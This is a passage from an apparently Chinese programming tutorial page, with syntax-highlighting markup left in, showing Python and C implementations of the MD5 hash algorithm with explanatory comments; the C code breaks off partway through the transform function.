class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">-</span>amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    message <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#copy our input into a mutable buffer</span>    orig_len_in_bits <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> len<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffffffffff</span>    message<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> len<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">64</span> <span class="token operator">!=</span> <span class="token number">56</span><span class="token punctuation">:</span>        message<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    message <span class="token operator">+=</span> orig_len_in_bits<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>    hash_pieces <span class="token operator">=</span> init_values<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> chunk_ofst <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d <span class="token operator">=</span> hash_pieces        chunk <span class="token operator">=</span> message<span class="token punctuation">[</span>chunk_ofst<span class="token punctuation">:</span>chunk_ofst<span class="token operator">+</span><span class="token number">64</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            f <span class="token operator">=</span> functions<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">)</span>            g <span class="token operator">=</span> index_functions<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            to_rotate <span class="token operator">=</span> a <span class="token operator">+</span> f <span class="token operator">+</span> constants<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>chunk<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>g<span class="token punctuation">:</span><span class="token number">4</span><span class="token operator">*</span>g<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>            new_b <span class="token operator">=</span> <span class="token punctuation">(</span>b <span class="token operator">+</span> left_rotate<span class="token punctuation">(</span>to_rotate<span class="token punctuation">,</span> rotate_amounts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>            a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d <span class="token operator">=</span> d<span class="token punctuation">,</span> new_b<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c        <span class="token keyword">for</span> i<span class="token punctuation">,</span> val <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            hash_pieces<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> val            hash_pieces<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span>    <span class="token keyword">return</span> sum<span class="token punctuation">(</span>x<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">*</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i<span class="token punctuation">,</span> x <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>hash_pieces<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">md5_to_hex</span><span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">:</span>    raw <span class="token operator">=</span> digest<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'{:032x}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>raw<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_md5</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> md5_to_hex<span class="token punctuation">(</span>md5<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    demo <span class="token operator">=</span> b<span class="token string">"123"</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span>demo<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'" => "'</span><span class="token punctuation">,</span>my_md5<span class="token punctuation">(</span>demo<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span> sep<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><h4 id="C语言版本版本"><a href="#C语言版本版本" class="headerlink" title="C语言版本版本"></a>C语言版本版本</h4><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token comment" spellcheck="true">/*md5转换用到的常量，算法本身规定的*/</span><span class="token macro property">#<span class="token directive keyword">define</span> S11 7</span><span class="token macro property">#<span class="token directive keyword">define</span> S12 12</span><span class="token macro property">#<span class="token directive keyword">define</span> S13 17</span><span class="token macro property">#<span class="token directive keyword">define</span> S14 22</span><span class="token macro property">#<span class="token directive keyword">define</span> S21 5</span><span class="token macro property">#<span class="token directive keyword">define</span> S22 9</span><span class="token macro property">#<span class="token directive keyword">define</span> S23 14</span><span class="token macro property">#<span class="token directive keyword">define</span> S24 20</span><span class="token macro property">#<span class="token directive keyword">define</span> S31 4</span><span class="token macro property">#<span class="token directive keyword">define</span> S32 11</span><span class="token macro property">#<span class="token directive keyword">define</span> S33 16</span><span class="token macro property">#<span class="token directive keyword">define</span> S34 23</span><span class="token macro property">#<span class="token directive keyword">define</span> S41 6</span><span class="token macro property">#<span class="token directive keyword">define</span> S42 10</span><span class="token macro property">#<span class="token directive keyword">define</span> S43 15</span><span class="token macro property">#<span class="token directive keyword">define</span> S44 21</span><span class="token macro property">#<span class="token directive keyword">define</span> R_memset(x, y, z) memset(x, y, z)</span><span class="token macro property">#<span class="token directive keyword">define</span> R_memcpy(x, y, z) memcpy(x, y, z)</span><span class="token macro property">#<span class="token directive keyword">define</span> R_memcmp(x, y, z) memcmp(x, y, z)</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> UINT4<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>POINTER<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* MD5 context. */</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* state (ABCD) */</span>  <span class="token comment" spellcheck="true">/*四个32bits数，用于存放最终计算得到的消息摘要。当消息长度〉512bits时，也用于存放每个512bits的中间结果*/</span>  UINT4 state<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* number of bits, modulo 2^64 (lsb first) */</span>  <span class="token comment" spellcheck="true">/*存储原始信息的bits数长度,不包括填充的bits，最长为 2^64 bits，因为2^64是一个64位数的最大值*/</span>  UINT4 count<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* input buffer */</span>  <span class="token comment" spellcheck="true">/*存放输入的信息的缓冲区，512bits*/</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> MD5_CTX<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">MD5Init</span><span class="token punctuation">(</span>MD5_CTX <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">MD5Update</span><span class="token punctuation">(</span>MD5_CTX <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">MD5Final</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> MD5_CTX <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">MD5Transform</span><span class="token punctuation">(</span>UINT4 <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Encode</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> UINT4 <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Decode</span><span class="token punctuation">(</span>UINT4 <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*用于bits填充的缓冲区，为什么要64个字节呢？因为当欲加密的信息的bits数被512除其余数为448时，需要填充的bits的最大值为512=64*8 。*/</span><span class="token keyword">static</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> PADDING<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*接下来的这几个宏定义是md5算法规定的，就是对信息进行md5加密都要做的运算。据说有经验的高手跟踪程序时根据这几个特殊的操作就可以断定是不是用的md5*/</span><span class="token comment" spellcheck="true">/* F, G, H and I are basic MD5 functions. */</span><span class="token macro property">#<span class="token directive keyword">define</span> F(x, y, z) (((x) &amp; (y)) | ((~x) &amp; (z)))</span><span class="token macro property">#<span class="token directive keyword">define</span> G(x, y, z) (((x) &amp; (z)) | ((y) &amp; (~z)))</span><span class="token macro property">#<span class="token directive keyword">define</span> H(x, y, z) ((x) ^ (y) ^ (z))</span><span class="token macro property">#<span class="token directive keyword">define</span> I(x, y, z) ((y) ^ ((x) | (~z)))</span><span class="token comment" spellcheck="true">/* ROTATE_LEFT rotates x left n bits. */</span><span class="token macro property">#<span class="token directive keyword">define</span> ROTATE_LEFT(x, n) (((x) &lt;&lt; (n)) | ((x) >> (32-(n))))</span><span class="token comment" spellcheck="true">/* FF, GG, HH, and II transformations for rounds 1, 2, 3, and 4.  Rotation is separate from addition to prevent recomputation. */</span><span class="token macro property">#<span class="token directive keyword">define</span> FF(a, b, c, d, x, s, ac) {  (a) += F ((b), (c), (d)) + (x) + (UINT4)(ac);  (a) = ROTATE_LEFT ((a), (s));  (a) += (b); }</span><span class="token macro property">#<span class="token directive keyword">define</span> GG(a, b, c, d, x, s, ac) {  (a) += G ((b), (c), (d)) + (x) + (UINT4)(ac);  (a) = ROTATE_LEFT ((a), (s));  (a) += (b); }</span><span class="token macro property">#<span class="token directive keyword">define</span> HH(a, b, c, d, x, s, ac) {  (a) += H ((b), (c), (d)) + (x) + (UINT4)(ac);  (a) = ROTATE_LEFT ((a), (s));  (a) += (b); }</span><span class="token macro property">#<span class="token directive keyword">define</span> II(a, b, c, d, x, s, ac) {  (a) += I ((b), (c), (d)) + (x) + (UINT4)(ac);  (a) = ROTATE_LEFT ((a), (s));  (a) += (b); }</span><span class="token comment" spellcheck="true">/* MD5 initialization. Begins an MD5 operation, writing a new context. */</span><span class="token comment" spellcheck="true">/*初始化md5的结构*/</span><span class="token keyword">void</span> <span class="token function">MD5Init</span> <span class="token punctuation">(</span>MD5_CTX <span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/*将当前的有效信息的长度设成0,这个很简单,还没有有效信息,长度当然是0了*/</span>    context<span class="token operator">-></span>count<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> context<span class="token operator">-></span>count<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Load magic initialization constants.*/</span>    <span class="token comment" spellcheck="true">/*初始化链接变量，算法要求这样，这个没法解释了*/</span>    context<span class="token operator">-></span>state<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x67452301</span><span class="token punctuation">;</span>    context<span class="token operator">-></span>state<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xefcdab89</span><span class="token punctuation">;</span>    context<span class="token operator">-></span>state<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x98badcfe</span><span class="token punctuation">;</span>    context<span class="token operator">-></span>state<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x10325476</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* MD5 block update operation. Continues an MD5 message-digest  operation, processing another message block, and updating the  context. */</span><span class="token comment" spellcheck="true">/*将与加密的信息传递给md5结构，可以多次调用context：初始化过了的md5结构input：欲加密的信息，可以任意长inputLen：指定input的长度*/</span><span class="token keyword">void</span> <span class="token function">MD5Update</span><span class="token punctuation">(</span>MD5_CTX <span class="token operator">*</span>context<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span> input<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span>  inputLen<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> index<span class="token punctuation">,</span> partLen<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Compute number of bytes mod 64 */</span>    <span class="token comment" spellcheck="true">/*计算已有信息的bits长度的字节数的模64, 64bytes=512bits。    用于判断已有信息加上当前传过来的信息的总长度能不能达到512bits，    如果能够达到则对凑够的512bits进行一次处理*/</span>    index <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>context<span class="token operator">-></span>count<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Update number of bits */</span><span class="token comment" spellcheck="true">/*更新已有信息的bits长度*/</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>context<span class="token operator">-></span>count<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>UINT4<span class="token punctuation">)</span>inputLen <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>UINT4<span class="token punctuation">)</span>inputLen <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        context<span class="token operator">-></span>count<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    context<span class="token operator">-></span>count<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>UINT4<span class="token punctuation">)</span>inputLen <span class="token operator">>></span> <span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*计算已有的字节数长度还差多少字节可以 凑成64的整倍数*/</span>    partLen <span class="token operator">=</span> <span class="token number">64</span> <span class="token operator">-</span> index<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Transform as many times as possible.    */</span>    <span class="token comment" spellcheck="true">/*如果当前输入的字节数 大于 已有字节数长度补足64字节整倍数所差的字节数*/</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>inputLen <span class="token operator">>=</span> partLen<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/*用当前输入的内容把context->buffer的内容补足512bits*/</span>        <span class="token function">R_memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>POINTER<span class="token punctuation">)</span><span class="token operator">&amp;</span>context<span class="token operator">-></span>buffer<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>POINTER<span class="token punctuation">)</span>input<span class="token punctuation">,</span> partLen<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*用基本函数对填充满的512bits（已经保存到context->buffer中） 做一次转换，转换结果保存到context->state中*/</span>        <span class="token function">MD5Transform</span><span class="token punctuation">(</span>context<span class="token operator">-></span>state<span class="token punctuation">,</span> context<span class="token operator">-></span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*        对当前输入的剩余字节做转换（如果剩余的字节&lt;在输入的input缓冲区中>大于512bits的话 ），        转换结果保存到context->state中        */</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> partLen<span class="token punctuation">;</span> i <span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">&lt;</span> inputLen<span class="token punctuation">;</span> i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*把i+63&lt;inputlen改为i+64&lt;=inputlen更容易理解*/</span>            <span class="token function">MD5Transform</span><span class="token punctuation">(</span>context<span class="token operator">-></span>state<span class="token punctuation">,</span> <span class="token operator">&amp;</span>input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span>        i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Buffer remaining input */</span>    <span class="token comment" spellcheck="true">/*将输入缓冲区中的不足填充满512bits的剩余内容填充到context->buffer中，留待以后再作处理*/</span>    <span class="token function">R_memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>POINTER<span class="token punctuation">)</span><span class="token operator">&amp;</span>context<span class="token operator">-></span>buffer<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>POINTER<span class="token punctuation">)</span><span class="token operator">&amp;</span>input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> inputLen<span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* MD5 finalization. Ends an MD5 message-digest operation, writing the  the message digest and zeroizing the context. */</span><span class="token comment" spellcheck="true">/*获取加密 的最终结果digest：保存最终的加密串context：你前面初始化并填入了信息的md5结构*/</span><span class="token keyword">void</span> <span class="token function">MD5Final</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> digest<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span>MD5_CTX <span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> bits<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> padLen<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Save number of bits */</span>    <span class="token comment" spellcheck="true">/*将要被转换的信息(所有的)的bits长度拷贝到bits中*/</span>    <span class="token function">Encode</span><span class="token punctuation">(</span>bits<span class="token punctuation">,</span> context<span class="token operator">-></span>count<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Pad out to 56 mod 64. */</span>    <span class="token comment" spellcheck="true">/* 计算所有的bits长度的字节数的模64, 64bytes=512bits*/</span>    index <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>context<span class="token operator">-></span>count<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*计算需要填充的字节数，padLen的取值范围在1-64之间*/</span>    padLen <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">&lt;</span> <span class="token number">56</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token number">56</span> <span class="token operator">-</span> index<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token number">120</span> <span class="token operator">-</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*这一次函数调用绝对不会再导致MD5Transform的被调用，因为这一次不会填满512bits*/</span>    <span class="token function">MD5Update</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> PADDING<span class="token punctuation">,</span> padLen<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Append length (before padding) */</span>    <span class="token comment" spellcheck="true">/*补上原始信息的bits长度（bits长度固定的用64bits表示），这一次能够恰巧凑够512bits，不会多也不会少*/</span>    <span class="token function">MD5Update</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> bits<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Store state in digest */</span>    <span class="token comment" spellcheck="true">/*将最终的结果保存到digest中。ok，终于大功告成了*/</span>    <span class="token function">Encode</span><span class="token punctuation">(</span>digest<span class="token punctuation">,</span> context<span class="token operator">-></span>state<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Zeroize sensitive information. */</span>    <span class="token function">R_memset</span><span class="token punctuation">(</span><span class="token punctuation">(</span>POINTER<span class="token punctuation">)</span>context<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* MD5 basic transformation. Transforms state based on block. */</span><span class="token comment" spellcheck="true">/*对512bits信息(即block缓冲区)进行一次处理，每次处理包括四轮state[4]：md5结构中的state[4]，用于保存对512bits信息加密的中间结果或者最终结果block[64]：欲加密的512bits信息*/</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">MD5Transform</span> <span class="token punctuation">(</span>UINT4 state<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> block<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    UINT4 a <span class="token operator">=</span> state<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b <span class="token operator">=</span> state<span class="token 